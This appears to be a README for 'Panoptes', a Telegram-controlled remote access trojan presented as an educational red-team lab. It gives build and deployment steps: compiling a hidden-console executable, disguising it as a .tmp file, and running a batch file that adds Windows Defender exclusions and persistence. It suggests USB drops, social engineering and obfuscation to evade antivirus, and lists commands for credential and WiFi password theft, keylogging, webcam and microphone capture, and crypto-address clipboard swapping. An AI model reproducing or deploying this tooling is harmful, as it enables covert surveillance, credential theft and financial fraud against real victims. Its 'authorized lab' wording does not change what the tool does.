# 🛡️ Panoptes - Endpoint Telemetry & C2 Simulation Framework (Educational Red Team Lab)

Authorized security research platform designed to study endpoint monitoring concepts, command-and-control (C2) architecture, and defensive detection methodologies in controlled laboratory environments.

This educational simulation focuses on understanding how remote administration frameworks generate telemetry, how security operations centers (SOCs) detect suspicious behavior patterns, and how defensive analysts investigate anomalous system activity through the lens of MITRE ATT&CK framework mappings.

Developed exclusively for cybersecurity training, red-team exercises, and defensive research in isolated environments to study both offensive techniques and defensive countermeasures.

## 🔍 Overview

Panoptes is a controlled cybersecurity research simulation that enables security professionals to study remote system monitoring concepts and command-and-control (C2) architectures within authorized testing environments.

The platform provides a comprehensive framework for analyzing how remote administration tools generate endpoint telemetry, how system monitoring produces detectable artifacts, and how security teams develop detection rules and investigation workflows for suspicious activities.

The **Quick Deployment** method requires **Administrator access** as the simulation framework has no built-in evasion techniques. This approach is designed for authorized lab environments where the `.bat` file is executed with elevated privileges to demonstrate persistence mechanisms and Windows Defender exclusion configurations—common scenarios in security training exercises. This deployment method can be executed via controlled USB drops in authorized testing environments or simulated social engineering scenarios within educational contexts.

The **Advanced Deployment** method demonstrates custom AV evasion techniques for research purposes. Participants compile a **custom executable** to study how sophisticated threats bypass security controls. This method is ideal for red-team training exercises and can be deployed through simulated software distribution scenarios or authorized physical access testing, as it **doesn't require admin rights** to function. Researchers can add their own **persistence mechanism** into the **main Python file** before compilation to study various persistence techniques.

## 🚀 Deployment Methods (Authorized Lab Environments)

### Method 1: Quick Deployment (Admin Required for Lab Testing)
```
custom_name.tmp + deploy.bat
```
<br>

**Step 1: Install Required Dependencies**

Open command prompt as administrator and run:

```
pip install requests pycryptodome opencv-python pillow pyperclip pynput sounddevice psutil win32crypt nuitka
```

If any module is missing, install it individually:

```
pip install "module name"
pip install requests  
pip install pycryptodome
```

<br>

**Step 2: Compile with Nuitka**

Compile to create a standalone executable:

```
nuitka --onefile --follow-imports --windows-disable-console --include-package=requests --include-package=pycryptodome --include-package=cv2 --include-package=PIL --include-package=pyperclip --include-package=pynput --include-package=sounddevice --include-package=psutil --include-package=win32crypt main.pyw
```

This will create a `.exe` file without console window.

<br>

**Step 3: Rename File for Lab Simulation**

Rename the compiled file (Command Prompt):

```
ren system.exe custom_name.tmp
```

*Renaming to `.tmp` demonstrates common file masquerading techniques for research and detection testing*

<br>

**Step 4: Update Batch File**

Update `deploy.bat` on line 16 with your new file name:

```
set "SOURCE_FILE=%~dp0custom_name.tmp"
```

<br>

**Step 5: Deploy in Lab Environment**

Add both files to the same folder and run `deploy.bat` as Administrator

- Batch file demonstrates automated Windows Defender exclusion configuration
- Creates persistence via scheduled tasks/registry (for detection research)
- Executes the simulation payload with full system privileges
  
**Ideal for:** Authorized lab environments, security training exercises, and controlled red-team simulations where system access is explicitly permitted.

<br>

### Method 2: Advanced Custom Deployment (Research Focus)

```
custom_app.exe (Packed / Obfuscated)
```

**How it works:**
- Modify ```main.pyw``` to create a unique executable for detection research
- Replace ```"TOKEN"``` & ```"ID``` with your lab-configured Telegram Bot Token and ID
- Use packing, obfuscation, file pumping, code signing and other evasion techniques to study AV bypass methods
- Since your compiled executable demonstrates evasive techniques, you can simulate legitimate program deployment
- Deploy payload in controlled environments to test defensive capabilities

**Ideal for:** Advanced red-team training, detection engineering research, and authorized security assessment exercises where evasive techniques are studied.

<br>

## 🛠️ Capabilities (Educational Research Features)

### 📡 Telemetry Collection
- **Live Screen Telemetry** - Real-time desktop monitoring data for SOC analysis
- **Webcam Data Capture** - Camera feed collection for research scenarios
- **Audio Capture** - Microphone data collection and analysis
- **Screen Activity Logging** - Desktop activity capture for forensic study

### ⌨️ Input Pattern Analysis
- **Keystroke Pattern Analysis** - Input behavior monitoring with periodic reporting
- **Clipboard Activity Monitoring** - Data flow analysis and pattern detection
- **Process Behavior Analysis** - System activity tracking and anomaly detection

### 📁 Data Access Simulation
- **Browser Data Analysis** - Study stored credential patterns and browsing habits
- **File System Access** - Remote file browsing and extraction simulation
- **WiFi Security Analysis** - Study saved credential storage patterns
- **System Profiling** - User, computer, and network enumeration

### 🔧 System Control (Authorized Environments)
- **Process Management** - View and terminate running processes for research
- **Remote Commands** - Execute system commands in controlled labs
- **User Interaction Simulation** - Display messages and error simulations
- **System Control** - Shutdown, restart, and persistence management

### 💰 Financial Security Research
- **Clipboard Injection Simulation** - Demonstrates cryptocurrency address manipulation techniques
- **Custom Address Management** - Study address swapping patterns for defense development
  
<br>

## 📋 Command Reference (Research Framework)

### Telemetry Collection Commands
```
/start - Initialize lab environment connection
/screenshot - Capture desktop screenshot for analysis
/picture - Take webcam photo for testing
/audio [seconds] - Record microphone for analysis
/record [seconds] - Record screen activity for study
/live screen - Start live desktop telemetry stream
/live camera - Start live webcam telemetry stream
/live mic - Start live microphone telemetry stream
/stop - Stop all active telemetry streams
```

### System Analysis Commands
```
/system - Get system information for profiling
/location - Get approximate geolocation data
/processes - List running processes for analysis
/kill [pid] - Terminate process (research purposes)
/wifi - Export saved WiFi passwords for security study
/clipboard - Show clipboard history for analysis
```

### Data Collection Commands
```
/steal - Extract browser login data for credential analysis
/history - Get browser history for behavior study
/downloads - Get download history for research
/files [path] - Browse file system for analysis
/download [path] - Download remote file for study
```

### Control Commands (Authorized Environments)
```
/msg [text] - Display message to test user interaction
/error - Show fake error message for social engineering research
/shutdown - Force system shutdown (authorized labs only)
/restart - Force system restart (authorized labs only)
/crypto - Show cryptocurrency address configuration
/swap [crypto] [address] - Set swap address for research
```

### Monitoring Commands
```
/keylogger on - Start keystroke monitoring research
/keylogger off - Stop keylogger data collection
```

<br>

## 🔧 Technical Architecture (Research Framework)

### Persistence Mechanisms (Detection Research)
- Scheduled tasks creation (study detection opportunities)
- Registry run keys (understand common persistence)
- Service installation (analyze system interaction)

### Simulation Features
- Process name management for research scenarios
- Temp folder operation study
- AV exclusion configuration research

### Communication
- Telegram bot API integration for lab control
- File upload/download capabilities
- Real-time command execution for research

<br>

## 📊 Performance Metrics

- **Real-time streaming**: 3-second intervals
- **Keylogger updates**: 30-second reports
- **File operations**: 50MB maximum upload
- **Process monitoring**: 25-process display limit
  
<br>

## 🔒 Security Research Considerations

- Operates from temporary directory for containment
- Uses system-standard communication channels
- Implements error handling for stability
- Includes cleanup mechanisms for lab environments
  
<br>

## ⚖️ Legal and Ethical Framework

This platform is designed exclusively for authorized security testing, educational research, and defensive training exercises within controlled environments. All deployment requires explicit authorization from system owners and must comply with all applicable laws and regulations. Users are solely responsible for obtaining proper authorization and ensuring ethical use. The developers assume no liability for misuse and strongly emphasize that this tool is intended solely for improving cybersecurity defenses through legitimate research and training.

<br>

## 🔬 Educational and Research Value

This project demonstrates critical cybersecurity concepts including:
- Remote administration framework architecture
- Multiple persistence technique implementations
- AV evasion and detection bypass strategies
- Real-time telemetry collection methodologies
- Telegram C2 communication patterns
- Social engineering attack vectors for security awareness
- Physical security assessment techniques for defense development
- MITRE ATT&CK framework mapping and analysis

### Research Applications:
- **SOC Training**: Develop and test detection rules
- **Red Team Exercises**: Practice authorized simulation scenarios  
- **Blue Team Development**: Understand attack patterns for defense
- **Forensic Analysis**: Study artifacts and indicators of compromise
- **Security Assessment**: Evaluate system monitoring capabilities
- **Academic Research**: Study cybersecurity concepts in controlled environments

---

*Built for educational cybersecurity research and authorized security testing only. All usage must be conducted in controlled environments with explicit permission from system owners.*
